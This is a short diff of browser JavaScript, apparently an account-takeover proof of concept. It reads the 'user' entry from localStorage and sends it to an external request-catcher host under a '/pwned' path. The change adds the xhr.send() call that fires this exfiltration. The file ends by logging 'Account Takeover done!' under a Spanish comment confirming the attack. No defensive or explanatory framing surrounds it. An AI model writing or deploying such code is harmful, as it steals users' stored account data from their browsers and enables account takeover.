@@ -20,8 +20,8 @@ const jsonData = JSON.stringify(data);
 xhr.send(jsonData);
 
 const user = localStorage.getItem('user');
-
 xhr.open('GET', 'https://x.requestcatcher.com/pwned?user='+user, true);
+xhr.send();
 
 // Confirmar por consola el ataque
 console.log("Account Takeover done!");
